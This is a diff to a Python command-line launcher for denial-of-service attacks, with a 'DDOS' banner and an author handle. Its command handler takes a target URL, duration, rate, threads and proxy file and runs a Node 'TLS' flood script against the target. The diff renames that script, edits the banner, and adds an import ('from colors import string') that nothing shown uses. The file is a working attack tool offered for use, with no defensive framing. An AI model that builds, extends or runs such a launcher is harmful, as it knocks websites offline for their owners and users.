@@ -9,6 +9,7 @@ import sys
 import json
 import platform
 import colorama
+from colors import string
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     while True:
@@ -69,9 +70,9 @@ def main():
 (()/( (()/(   )\()) (()/(  
  /(_)) /(_)) ((_)\   /(_)) 
 (_))_ (_))_    ((_) (_))   
- |    \   |   \    / _ \   / __|  
- | |) ||  |)   ||  | (_) | \__ \  
- |___/ |___/  \___/ |___/  
+ |    \|   \  / _ \  / __|  
+ | |) ||)  ||| (_) | \__ \  
+ |___/ |___/  \___/  |___/  
  """
     author = r"""
 		MR.X4ND3R
@@ -105,7 +106,7 @@ def main():
                 Rate = cnc.split()[3]
                 threads = cnc.split()[4]
                 proxyfile = cnc.split()[5]
-                os.system(f'node methods/TLS/TLS.js {target} {time} {Rate} {threads} {proxyfile}')
+                os.system(f'node methods/TLS/TLSv1.js {target} {time} {Rate} {threads} {proxyfile}')
             except IndexError:
                 print('Usage: TLS <TARGET> <TIME> <RATE> <THREADS> <PROXYFILE>')
                 print('Example: TLS http://example.com 100 64 5 http.txt')
